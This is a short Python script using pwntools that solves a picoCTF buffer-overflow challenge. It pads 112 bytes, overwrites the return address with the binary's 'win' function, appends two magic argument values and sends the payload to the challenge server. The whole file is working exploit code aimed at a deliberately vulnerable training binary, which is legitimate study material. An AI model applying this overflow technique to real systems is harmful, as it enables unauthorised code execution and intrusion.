#!/usr/bin/env python3
import pwn
# Set up the connection to the remote service
target_host = "saturn.picoctf.net"  # Replace with the actual target hostname
target_port = 57950  # Replace with the actual target port
# ELF binary is still useful to extract symbols, even for remote exploitation
elf = pwn.ELF("./vuln")
# Construct the payload
offset = 112
new_eip = pwn.p32(elf.symbols["win"])  # Corrected pwn32 to p32
arg1 = pwn.p32(0xCAFEF00D)  # Corrected pwn32 to p32
arg2 = pwn.p32(0xF00DF00D)  # Corrected pwn32 to p32
payload = b"A" * offset + new_eip + pwn.p32(0) + arg1 + arg2
payload += b"\n"
# Connect to the remote service
p = pwn.remote(target_host, target_port)
# Send the payload
p.sendline(payload)
# Receive and print the response (hopefully the flag)
p.interactive()
